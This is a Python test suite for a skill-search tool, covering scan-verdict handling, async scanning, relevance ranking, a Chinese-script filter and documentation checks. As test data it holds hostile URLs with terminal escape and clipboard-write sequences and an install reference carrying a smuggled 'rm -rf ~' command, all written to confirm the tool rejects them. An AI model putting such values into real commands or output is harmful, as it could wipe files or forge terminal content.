        a.merge(fs.SkillResult(name="x", description="", source="skillsmp",
                               url="https://github.com/a/b/skills/c"))
        self.assertEqual(a.url, "https://github.com/a/b/skills/c")

    def test_hostile_url_never_fills_an_empty_slot(self):
        a = fs.SkillResult(name="x", description="", source="clawhub")
        a.merge(fs.SkillResult(name="x", description="", source="skillsmp",
                               url="skills://evil/x"))
        self.assertEqual(a.url, "")


class ScanReasonsAreNotDiscarded(unittest.TestCase):
    """SKILL.md tells the agent to surface 'the reasons' before installing.

    The response carries them, so dropping them made that instruction
    impossible to follow -- worst in exactly the HIGH/CRITICAL case.
    """

    URL = "https://clawhub.ai/awspace/pdf"

    def _patch(self, fn):
        return mock.patch.object(fs.urllib.request, "urlopen", side_effect=fn)

    def test_reasons_are_captured(self):
        reasons = []
        with self._patch(lambda r, timeout=None: _Resp(LIVE_VERDICT)):
            got = asyncio.run(fs.scan_skill(self.URL, reasons_into=reasons))
        self.assertEqual(got, "MEDIUM")
        self.assertTrue(reasons, "reasons were read from the wire then dropped")
        self.assertIn("external software", reasons[0])

    def test_reasons_are_sanitised(self):
        reasons = []
        hostile = {"severity": "HIGH", "reasons": ["\x1b[1;31mdanger\x1b[0m"]}
        with self._patch(lambda r, timeout=None: _Resp(hostile)):
            asyncio.run(fs.scan_skill(self.URL, reasons_into=reasons))
        self.assertTrue(reasons)
        self.assertNotIn("\x1b", reasons[0])

    def test_result_carries_reasons_to_display(self):
        r = fs.SkillResult(name="pdf", description="", source="clawhub")
        r.security = "HIGH"
        r.security_reasons = ["uses an untrusted binary"]
        import io, contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            fs.display_results([r], "pdf", show_install=False)
        self.assertIn("untrusted binary", buf.getvalue())

    def test_reasons_absent_leaves_none(self):
        reasons = []
        with self._patch(lambda r, timeout=None: _Resp({"severity": "SAFE"})):
            asyncio.run(fs.scan_skill(self.URL, reasons_into=reasons))
        self.assertEqual(reasons, [])


class ScanDoesNotBlockTheEventLoop(unittest.TestCase):
    """urlopen was called directly inside the coroutine.

    A single slow URL froze every other scan for the full socket wait. The GET
    helpers already used asyncio.to_thread; the POST did not.
    """

    URLS = [f"https://clawhub.ai/o{i}/s" for i in range(3)]

    def setUp(self):
        self._saved = getattr(fs, "SCAN_RETRY_DELAY", None)
        fs.SCAN_RETRY_DELAY = 0
        self.addCleanup(self._restore)

    def _restore(self):
        if self._saved is None:
            try:
                del fs.SCAN_RETRY_DELAY
            except AttributeError:
                pass
        else:
            fs.SCAN_RETRY_DELAY = self._saved

    def test_a_heartbeat_coroutine_keeps_ticking_during_scans(self):
        import time

        def slow(req, timeout=None):
            time.sleep(0.30)          # blocking call, as urlopen is
            return _Resp(LIVE_VERDICT)

        async def scenario():
            gaps = []
            stop = False

            async def heartbeat():
                last = time.monotonic()
                while not stop:
                    await asyncio.sleep(0.01)
                    now = time.monotonic()
                    gaps.append(now - last)
                    last = now

            task = asyncio.create_task(heartbeat())
            with mock.patch.object(fs.urllib.request, "urlopen",
                                   side_effect=slow):
                await asyncio.gather(*(fs.scan_skill(u)
                                       for u in self.URLS))
            stop = True
            await task
            return max(gaps) if gaps else 0.0

        worst = asyncio.run(scenario())
        # Serialised blocking would freeze the loop ~0.9s.
        self.assertLess(worst, 0.25,
                        f"event loop stalled {worst:.2f}s during scans")


class SourceFailuresAreVisible(unittest.TestCase):
    """gather(return_exceptions=True) discarded failures with no trace.

    A registry returning malformed JSON made a whole source vanish, and the
    user saw a confident 'No skills found' instead of an error.
    """

    def test_a_raising_searcher_is_reported(self):
        async def boom(query, limit=5):
            raise ValueError("registry sent a list, not an object")

        async def fine(query, limit=5):
            return [fs.SkillResult(name="pdf-editor", description="",
                                   source="clawhub")]

        saved = dict(fs.SOURCE_SEARCHERS)
        fs.SOURCE_SEARCHERS = {"broken": boom, "clawhub": fine}
        try:
            import io, contextlib
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                results = asyncio.run(fs.find_skills("pdf", sources=["broken",
                                                                      "clawhub"]))
            text = err.getvalue()
        finally:
            fs.SOURCE_SEARCHERS = saved
        self.assertEqual(len(results), 1)
        self.assertIn("broken", text, "failed source must be named")
        self.assertIn("registry sent a list", text, "cause must be shown")


class LimitIsValidated(unittest.TestCase):
    """--limit 0 or -1 looked identical to an empty registry."""

    def test_non_positive_limit_is_rejected_by_the_parser(self):
        import subprocess, sys
        script = os.path.join(_HERE, os.pardir, "scripts", "find_skill.py")
        for bad in ["0", "-1", "-5"]:
            proc = subprocess.run(
                [sys.executable, script, "pdf", "--limit", bad],
                capture_output=True, text=True, timeout=60)
            self.assertNotEqual(proc.returncode, 0,
                                f"--limit {bad} was accepted")
            self.assertIn("limit", proc.stderr.lower())

    def test_positive_limit_is_accepted_by_the_parser(self):
        import subprocess, sys
        script = os.path.join(_HERE, os.pardir, "scripts", "find_skill.py")
        proc = subprocess.run(
            [sys.executable, script, "pdf", "--limit", "2", "--help"],
            capture_output=True, text=True, timeout=60)
        self.assertEqual(proc.returncode, 0)


class DocsMatchTheCode(unittest.TestCase):
    """Docs drift was the most common finding across both reviews.

    Each test below locks a specific correction so it cannot silently revert.
    """

    ROOT = os.path.abspath(os.path.join(_HERE, os.pardir))

    def _read(self, *parts):
        path = os.path.join(self.ROOT, *parts)
        if not os.path.exists(path):
            # clawhub publish ships 7 files and drops skill-card.md, so this
            # cannot run from an installed copy. Guarantees for the files
            # that do ship live in ShippedPackageIsSelfConsistent instead.
            self.skipTest(f"{'/'.join(parts)} is not shipped in the package")
        with open(path, encoding="utf-8") as fh:
            return fh.read()

    def test_version_is_consistent_across_package(self):
        ua = fs.USER_AGENT.rsplit("/", 1)[-1]
        card = self._read("skill-card.md")
        m = re.search(r"## Skill Version\(s\):\s*\n\s*([0-9][^\s]*)", card)
        self.assertIsNotNone(m, "skill-card.md has no Skill Version(s)")
        self.assertEqual(m.group(1), ua,
                         "skill-card.md and the User-Agent disagree on version")

    def test_sources_md_cites_the_current_version(self):
        src = self._read("references", "sources.md")
        ua = fs.USER_AGENT.rsplit("/", 1)[-1]
        self.assertIn(ua, src, "references/sources.md cites a stale version")

    def test_scan_is_not_described_as_the_only_egress(self):
        """v1.2.2 corrected a false privacy claim that could leak data."""
        src = self._read("references", "sources.md")
        self.assertNotIn("the **only** part of the tool that sends data",
                         src)
        self.assertIn("Any search", src,
                      "sources.md must state that a plain search also "
                      "discloses the query")

    def test_skill_md_warns_that_the_query_is_disclosed(self):
        skill = self._read("SKILL.md")
        self.assertIn("query", skill)
        self.assertIn("skillsmp", skill.lower())

    def test_all_five_severities_are_documented_as_verified(self):
        """All five were observed live on 2026-10-16 across 87 skills.

        Earlier this test asserted the vocabulary was hedged as unconfirmed,
        which was true of SKILL.md until the 87-skill scan settled it.
        """
        skill = self._read("SKILL.md")
        for sev in ("SAFE", "LOW", "MEDIUM", "HIGH", "CRITICAL"):
            self.assertIn(sev, skill, f"{sev} missing from SKILL.md")
        self.assertIn("observed live", skill)

    def test_no_verdict_is_documented_as_not_safe(self):
        """55 of 87 lookups returned nothing. That is not a clean result."""
        skill = self._read("SKILL.md")
        self.assertIn("no verdict at all", skill)
        self.assertIn("not that it is safe", skill)

    def test_skill_md_documents_the_not_scanned_case(self):
        skill = self._read("SKILL.md")
        self.assertIn("not scanned", skill)

    def test_skill_md_documents_analysis_pending(self):
        """skill-card.md cites this token; it must actually exist."""
        skill = self._read("SKILL.md")
        self.assertIn("analysis_pending", skill)

    def test_throwaway_probes_are_not_in_the_package(self):
        for name in ("check_scanners.py", "probe_gendigital.py",
                     "probe_gendigital2.py", "probe_gendigital3.py",
                     "probe_verdict.py"):
            self.assertFalse(
                os.path.exists(os.path.join(self.ROOT, name)),
                f"{name} is a throwaway dev script and would ship")

    def test_test_suite_has_no_vacuous_placeholder(self):
        """Guards the specific vacuous assertions found in review.

        The needle is assembled at runtime so this test cannot match its own
        source line.
        """
        src = self._read("tests", "test_find_skill.py")
        needle = "self.assert" + "True(True)"
        self.assertNotIn(needle, src)

    def test_unittest_main_is_the_last_statement_in_the_file(self):
        """A mid-file `unittest.main()` silently skips everything after it.

        This was the v1.2.1 bug, and it was reintroduced by accident while
        appending new test classes. It is invisible: `unittest discover` still
        reports every test, so only the direct invocation exposes it.
        """
        path = os.path.join(self.ROOT, "tests", "test_find_skill.py")
        with open(path, encoding="utf-8") as fh:
            lines = [ln.rstrip() for ln in fh if ln.strip()]
        main_at = [i for i, ln in enumerate(lines)
                   if ln.strip() == 'unittest.main(verbosity=2)']
        self.assertTrue(main_at, "no unittest.main() block found")
        self.assertEqual(main_at[-1], len(lines) - 1,
                         f"unittest.main() is at line {main_at[-1] + 1} of "
                         f"{len(lines)}; anything after it never runs under "
                         f"`python3 tests/test_find_skill.py`")

    # NOTE: comparing the two entry points is deliberately not a test. Each
    # invocation runs this file, so a test that shells out to the other would
    # recurse forever. Verify from the shell instead:
    #   python3 tests/test_find_skill.py | grep '^Ran'
    #   python3 -m unittest discover -s tests | grep '^Ran'


class RelevanceScoring(unittest.TestCase):
    """v1.3.0: score() had no query-relevance term at all.

    score() was breadth*0.35 + popularity*0.35 + authority*0.30, so a skill
    matching one query word outranked a better fit purely by being popular.
    """

    def test_exact_query_in_name_scores_highest(self):
        r = fs.SkillResult(name="pdf-editor", description="Edits PDF files.",
                           source="clawhub")
        self.assertGreater(fs.relevance("pdf editor", r), 0.9)

    def test_a_single_word_match_scores_below_a_full_match(self):
        good = fs.SkillResult(name="pdf-editor", description="", source="clawhub")
        weak = fs.SkillResult(name="visa-doc-translate",
                             description="Translates visa documents",
                             source="skillsmp")
        self.assertGreater(fs.relevance("pdf editor", good),
                           fs.relevance("pdf editor", weak))

    def test_name_match_outweighs_description_match(self):
        in_name = fs.SkillResult(name="pdf-editor", description="",
                                 source="clawhub")
        in_desc = fs.SkillResult(name="document-tool",
                                 description="A pdf editor for files",
                                 source="clawhub")
        self.assertGreater(fs.relevance("pdf editor", in_name),
                           fs.relevance("pdf editor", in_desc))

    def test_unrelated_skill_scores_near_zero(self):
        r = fs.SkillResult(name="seo-audit", description="Audits websites",
                           source="clawhub")
        self.assertLess(fs.relevance("pdf editor", r), 0.2)

    def test_empty_query_is_neutral_not_zero(self):
        r = fs.SkillResult(name="pdf-editor", description="", source="clawhub")
        self.assertGreater(fs.relevance("", r), 0.0)

    def test_relevance_is_always_a_fraction(self):
        for q in ["", "   ", "pdf", "a", "pdf editor pro max", "!!!" ]:
            for n in ["pdf", "x", "ultimate-skills-finder"]:
                v = fs.relevance(q, fs.SkillResult(name=n, description="",
                                                   source="clawhub"))
                self.assertGreaterEqual(v, 0.0, (q, n))
                self.assertLessEqual(v, 1.0, (q, n))

    def test_stopwords_do_not_dilute(self):
        r = fs.SkillResult(name="pdf-editor", description="", source="clawhub")
        self.assertGreaterEqual(fs.relevance("a pdf editor for the", r),
                                fs.relevance("pdf editor", r) - 0.05)

    def test_non_stopword_extra_terms_still_dilute(self):
        """Only genuine stopwords are ignored; real terms count."""
        r = fs.SkillResult(name="pdf-editor", description="", source="clawhub")
        self.assertLess(fs.relevance("pdf editor invoices", r),
                        fs.relevance("pdf editor", r))


class RelevanceDominatesPopularity(unittest.TestCase):
    """The regression that motivated v1.3.0.

    A popular skill matching one query word must not outrank a worse-fitting
    one, which is exactly what the live 'pdf editor' search got wrong.
    """

    def _ranked(self, query, results):
        merged = fs.deduplicate(results)
        merged.sort(key=lambda r: r.score(query), reverse=True)
        return [r.name for r in merged]

    def test_better_fit_beats_more_popular(self):
        popular_but_off = fs.SkillResult(
            name="visa-doc-translate", description="Translates documents",
            source="skillsmp", downloads=9000)
        good_fit = fs.SkillResult(
            name="pdf-editor", description="Edits PDF files",
            source="clawhub", downloads=10)
        order = self._ranked("pdf editor", [popular_but_off, good_fit])
        self.assertEqual(order[0], "pdf-editor")

    def test_popular_flag_still_sorts_by_popularity(self):
        a = fs.SkillResult(name="alpha", description="", source="clawhub",
                           downloads=10)
        b = fs.SkillResult(name="beta", description="", source="clawhub",
                           downloads=9000)
        ordered = sorted([a, b], key=lambda r: (r.downloads, r.stars),
                         reverse=True)
        self.assertEqual(ordered[0].name, "beta")

    def test_score_still_works_without_a_query(self):
        """Existing callers pass no query; that path must not raise."""
        r = fs.SkillResult(name="pdf-editor", description="", source="clawhub")
        self.assertIsInstance(r.score(), float)

    def test_score_range_stays_bounded_with_a_query(self):
        r = fs.SkillResult(name="pdf-editor", description="Edits PDFs",
                           source="clawhub", downloads=999999, stars=999999)
        for q in ["", "pdf", "pdf editor", "unrelated thing"]:
            v = r.score(q)
            self.assertGreaterEqual(v, 0.0, q)
            self.assertLessEqual(v, 1.0, q)


class PopularityMixesWithFit(unittest.TestCase):
    """Installs and fit are both in the score -- but installs must discriminate.

    The linear `installs/10000` scale pinned 21 of 93 corpus results at exactly
    1.00, so popularity carried no information among popular skills: 11
    installs and 1,069,913 both scored the same. Log scaling restores it.
    """

    def _pop(self, downloads):
        r = fs.SkillResult(name="x", description="", source="clawhub",
                           downloads=downloads)
        return r._pop_log()

    def test_popularity_discriminates_across_five_orders_of_magnitude(self):
        vals = [self._pop(d) for d in (0, 11, 192, 4105, 93309, 1069913)]
        self.assertEqual(vals, sorted(vals), "not monotonic in installs")
        self.assertGreater(len(set(round(v, 3) for v in vals)), 5,
                           "popularity collapsed to a constant")

    def test_popularity_is_bounded(self):
        for d in (0, 1, 10**6, 10**9):
            v = self._pop(d)
            self.assertGreaterEqual(v, 0.0)
            self.assertLessEqual(v, 1.0)

    def test_equal_fit_prefers_the_more_installed(self):
        a = fs.SkillResult(name="pdf", description="", source="clawhub",
                           downloads=10)
        b = fs.SkillResult(name="pdf", description="", source="clawhub",
                           downloads=5000)
        self.assertGreater(b.score("pdf"), a.score("pdf"))

    def test_better_fit_beats_many_more_installs(self):
        weak = fs.SkillResult(name="lark-mail", description="Team chat suite",
                              source="clawhub", downloads=776496)
        strong = fs.SkillResult(name="uspeedo-email-sending-channel",
                                description="Sending email channel",
                                source="clawhub", downloads=1159)
        self.assertGreater(strong.score("email sending"),
                           weak.score("email sending"))

    def test_zero_install_skill_still_ranks_on_fit(self):
        r = fs.SkillResult(name="sql-query-generator", description="Generate SQL",
                           source="clawhub", downloads=0, stars=3)
        j = fs.SkillResult(name="basin", description="Web crawling",
                           source="clawhub", downloads=12738)
        self.assertGreater(r.score("sql query"), j.score("sql query"))

    def test_all_four_terms_contribute(self):
        """Weighting is a genuine mix, not fit with decoration."""
        base = fs.SkillResult(name="alpha", description="alpha", source="clawhub")
        fit_only = fs.SkillResult(name="alpha beta", description="alpha beta",
                                  source="clawhub")
        pop_only = fs.SkillResult(name="alpha", description="alpha",
                                  source="clawhub", downloads=9000)
        both = fs.SkillResult(name="alpha beta", description="alpha beta",
                              source="clawhub", downloads=9000)
        q = "alpha beta"
        self.assertGreater(fit_only.score(q), base.score(q))
        self.assertGreater(pop_only.score(q), base.score(q))
        self.assertGreater(both.score(q), fit_only.score(q))
        self.assertGreater(both.score(q), pop_only.score(q))



class ChineseScriptFilter(unittest.TestCase):
    """--exclude-chinese drops results written in Chinese.

    Han characters are also Japanese kanji, so a naive "contains CJK" test
    would delete Japanese skills. Kana (kana present) means Japanese, which
    this filter must leave alone.
    """

    def test_pure_chinese_is_detected(self):
        for t in ["PDF编辑器", "SQL查询工具(免费版)", "HTTP Retry - HTTP 重试机制",
                  "微信机器人"]:
            self.assertTrue(fs.is_chinese_text(t), t)

    def test_japanese_with_kana_is_not_chinese(self):
        for t in ["PDF編集ツール", "写真ツール", "メモ帳スキル"]:
            self.assertFalse(fs.is_chinese_text(t), t)

    def test_english_is_not_chinese(self):
        for t in ["pdf-editor", "PDF Editor", "seo audit", ""]:
            self.assertFalse(fs.is_chinese_text(t), repr(t))

    def test_mixed_name_with_stray_cjk_is_not_chinese(self):
        """One emoji or stray glyph must not delete an English skill."""
        for t in ["pdf-editor ✨", "data-toolkit", "ai 🤖"]:
            self.assertFalse(fs.is_chinese_text(t), t)

    def test_ratio_based_not_presence_based(self):
        """A long English description quoting a term stays English."""
        t = ("A comprehensive toolkit for managing PDF documents, "
             "including editing, merging, splitting and conversion. "
             "Supports batch operations and automation pipelines.")
        self.assertFalse(fs.is_chinese_text(t))
        cn = ("这是一个用于编辑和转换PDF文件的综合工具包，"
              "支持批量操作以及自动化流水线。")
        self.assertTrue(fs.is_chinese_text(cn))

    def test_korean_hangul_is_not_chinese(self):
        self.assertFalse(fs.is_chinese_text("PDF 편집 도구"))

    def test_result_uses_name_or_description(self):
        r = fs.SkillResult(name="pdf-editor", description="PDF编辑器",
                           source="clawhub")
        self.assertTrue(fs.is_chinese_result(r))
        r2 = fs.SkillResult(name="PDF编辑器", description="Edits PDFs",
                            source="clawhub")
        self.assertTrue(fs.is_chinese_result(r2))
        r3 = fs.SkillResult(name="pdf-editor", description="Edits PDFs",
                            source="clawhub")
        self.assertFalse(fs.is_chinese_result(r3))

    def test_filter_reports_how_many_it_dropped(self):
        """Never silently: the user must learn what disappeared."""
        kept = fs.SkillResult(name="pdf-editor", description="Edits PDFs",
                              source="clawhub")
        dropped = fs.SkillResult(name="PDF编辑器", description="编辑PDF",
                                 source="clawhub")
        import io, contextlib
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            out = fs.filter_chinese([kept, dropped])
        self.assertEqual([r.name for r in out], ["pdf-editor"])
        self.assertIn("1", err.getvalue())

    def test_filter_is_a_no_op_on_empty_and_all_english(self):
        import io, contextlib
        rows = [fs.SkillResult(name="a", description="", source="clawhub"),
                fs.SkillResult(name="b", description="", source="clawhub")]
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(len(fs.filter_chinese(rows)), 2)
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(fs.filter_chinese([]), [])


class UrlEscapeInjectionRejected(unittest.TestCase):
    """ClawHub security audit finding: URLs bypassed sanitize_text().

    v1.2.2 sanitised name, description, author and version, but left the URL
    untouched. is_disclosable_url() only checked scheme and netloc, so a URL
    carrying ESC, OSC-52, BEL, bidi overrides or zero-width characters passed
    and was printed raw -- letting a listing forge terminal output or write to
    the clipboard.
    """

    HOSTILE = [
        ("OSC 52 clipboard", "https://evil.com/\x1b]52;c;cHVDOWNLOADED\x07"),
        ("ANSI colour",     "https://evil.com/\x1b[1;31mSAFE\x1b[0m"),
        ("BEL",             "https://evil.com/x\x07"),
        ("newline",         "https://evil.com/x\nFAKE"),
        ("carriage return", "https://evil.com/x\rFAKE"),
        ("tab",             "https://evil.com/x\tFAKE"),
        ("C1 control",      "https://evil.com/x\x9b31m"),
        ("bidi override",   "https://evil.com/\u202eFAKE"),
        ("zero width",      "https://evil.com/\u200bFAKE"),
        ("ESC in path",     "https://good.com/\x1b/../evil"),
    ]

    def test_hostile_urls_are_rejected(self):
        for label, url in self.HOSTILE:
            with self.subTest(case=label):
                self.assertFalse(fs.is_disclosable_url(url), label)

    def test_hostile_url_is_dropped_at_construction(self):
        for label, url in self.HOSTILE:
            with self.subTest(case=label):
                r = fs.SkillResult(name="x", description="", source="skillsmp",
                                   url=url)
                self.assertEqual(r.url, "", label)

    def test_no_control_character_reaches_the_terminal(self):
        """End-to-end: rendered output must carry no C0/C1/ESC at all."""
        import io, contextlib
        for label, url in self.HOSTILE:
            with self.subTest(case=label):
                r = fs.SkillResult(name="x", description="", source="skillsmp",
                                   url=url)
                buf = io.StringIO()
                with contextlib.redirect_stdout(buf):
                    fs.display_results([r], "x", show_install=False)
                out = buf.getvalue()
                self.assertNotIn("\x1b", out, label)
                for bad in ("\x07", "\x9b", "\u202e", "\u200b"):
                    self.assertNotIn(bad, out, label)

    def test_legitimate_urls_still_pass(self):
        for url in ["https://clawhub.ai/owner/skill",
                    "http://example.com/x",
                    "https://github.com/a/b/tree/main/docs/skills/c",
                    "https://example.com/path?q=1&r=2"]:
            self.assertTrue(fs.is_disclosable_url(url), url)

    def test_embedded_credentials_are_rejected(self):
        """Userinfo in a URL is a phishing shape; do not display or send it."""
        self.assertFalse(fs.is_disclosable_url("https://user:pw@clawhub.ai/a/b"))

    def test_normalisation_does_not_launder_a_hostile_url(self):
        """normalize_scan_url must not be the thing that cleans it up."""
        bad = "https://evil.com/a\x1b[1mb"
        self.assertNotEqual(fs.normalize_scan_url(bad), bad)


class ShippedPackageIsSelfConsistent(unittest.TestCase):
    """clawhub publish ships 7 files and silently drops skill-card.md.

    Tests run from an *installed* copy must therefore tolerate its absence,
    or the published suite fails on arrival. These assert the guarantees that
    hold for the files that do ship.
    """

    ROOT = os.path.abspath(os.path.join(_HERE, os.pardir))
    OPTIONAL = ("skill-card.md",)

    def _read(self, *parts):
        with open(os.path.join(self.ROOT, *parts), encoding="utf-8") as fh:
            return fh.read()

    def _read_optional(self, name):
        path = os.path.join(self.ROOT, name)
        if not os.path.exists(path):
            self.skipTest(f"{name} is not shipped in the published package")
        return self._read(name)

    def test_the_module_under_test_imports_cleanly(self):
        """The one thing that must work everywhere."""
        self.assertTrue(hasattr(fs, "find_skills"))
        self.assertTrue(callable(fs.relevance))
        self.assertTrue(callable(fs.scan_skill))
        self.assertTrue(callable(fs.is_disclosable_url))

    def test_shipped_docs_agree_with_the_code(self):
        skill = self._read("SKILL.md")
        self.assertIn(fs.GEN_DIGITAL_HOST, skill)
        self.assertIn("--share-urls", skill)
        self.assertIn("not scanned", skill)

    def test_sources_md_cites_the_current_version(self):
        src = self._read("references", "sources.md")
        self.assertIn(fs.USER_AGENT.rsplit("/", 1)[-1], src)

    def test_changelog_records_the_version_gap(self):
        self.assertIn("1.0.0", self._read("CHANGELOG.md"))

    def test_scan_is_not_described_as_the_only_egress(self):
        src = self._read("references", "sources.md")
        self.assertNotIn("the **only** part of the tool that sends data", src)
        self.assertIn("Any search", src)

    def test_skill_md_warns_the_query_is_disclosed(self):
        skill = self._read("SKILL.md")
        self.assertIn("query", skill)

    def test_unverified_severities_are_hedged_in_skill_md(self):
        skill = self._read("SKILL.md")
        self.assertIn("observed live", skill)

    def test_skill_md_documents_analysis_pending(self):
        self.assertIn("analysis_pending", self._read("SKILL.md"))

    def test_throwaway_probes_are_not_in_the_package(self):
        for name in ("check_scanners.py", "probe_gendigital.py",
                     "probe_gendigital2.py", "probe_gendigital3.py",
                     "probe_verdict.py"):
            self.assertFalse(os.path.exists(os.path.join(self.ROOT, name)), name)

    def test_unittest_main_is_the_last_statement_in_the_file(self):
        path = os.path.join(self.ROOT, "tests", "test_find_skill.py")
        with open(path, encoding="utf-8") as fh:
            lines = [ln.rstrip() for ln in fh if ln.strip()]
        main_at = [i for i, ln in enumerate(lines)
                   if ln.strip() == 'unittest.main(verbosity=2)']
        self.assertTrue(main_at, "no unittest.main() block found")
        self.assertEqual(main_at[-1], len(lines) - 1,
                         f"unittest.main() is at line {main_at[-1] + 1} of "
                         f"{len(lines)}; anything after it never runs")


class MirroredAuthority(unittest.TestCase):
    """ClawHub mirrors skills.sh entries and awards them clawhub authority.

    Measured 2026-10-16: 12 of 77 sampled ClawHub results carried
    install.kind == "skills-sh" and had NO native block. Those entries are
    mirrored, not vouched for, yet the old code hardcoded source="clawhub",
    so a skills.sh skill earned clawhub's 1.00 purely for passing through.
    The top-scoring entry in that sample was one of them.
    """

    def _run(self, kind, reference):
        async def go():
            original = fs.fetch_json

            async def fake(url):
                return {"results": [{
                    "slug": "x", "displayName": "X", "summary": "s",
                    "canonicalUrl": "/o/s",
                    "install": {"kind": kind, "reference": reference},
                }]}

            fs.fetch_json = fake
            try:
                return await fs.search_clawhub("x", limit=5)
            finally:
                fs.fetch_json = original
        return asyncio.run(go())

    def test_mirrored_entry_is_attributed_to_skills_sh(self):
        results = self._run("skills-sh", "skills-sh:starchild/repo/skill")
        self.assertEqual(results[0].sources, ["skills.sh"],
                         "a mirrored entry must not be credited to clawhub")

    def test_mirrored_entry_gets_skills_sh_authority(self):
        results = self._run("skills-sh", "skills-sh:starchild/repo/skill")
        authority = max(fs.SOURCE_WEIGHTS.get(s, 0.5)
                        for s in results[0].sources)
        self.assertEqual(authority, fs.SOURCE_WEIGHTS["skills.sh"])
        self.assertLess(authority, fs.SOURCE_WEIGHTS["clawhub"])

    def test_native_clawhub_entry_keeps_clawhub_authority(self):
        results = self._run("clawhub", "owner/slug")
        self.assertEqual(results[0].sources, ["clawhub"])
        self.assertEqual(
            max(fs.SOURCE_WEIGHTS.get(s, 0.5) for s in results[0].sources),
            fs.SOURCE_WEIGHTS["clawhub"])

    def test_attribution_does_not_break_the_install_command(self):
        """The reference is still validated and still installable."""
        results = self._run("skills-sh", "skills-sh:starchild/repo/skill")
        self.assertEqual(results[0].install_args,
                         ["openclaw", "skills", "install",
                          "skills-sh:starchild/repo/skill"])
        self.assertTrue(results[0].installable)

    def test_hostile_mirrored_reference_is_still_rejected(self):
        results = self._run("skills-sh", "skills-sh:evil; rm -rf ~")
        self.assertEqual(results[0].install_args, [])
        self.assertEqual(results[0].sources, ["skills.sh"],
                         "rejection must not change attribution")


# MUST be the final statement in this file. A `unittest.main()` placed
# mid-module silently skips every class defined after it, and `unittest
# discover` still reports the full count -- so only the direct invocation
# exposes it. That bug shipped in v1.2.1 (21 of 61 skipped) and has been
# reintroduced twice since. DocsMatchTheCode asserts this block is last.
if __name__ == "__main__":
    unittest.main(verbosity=2)
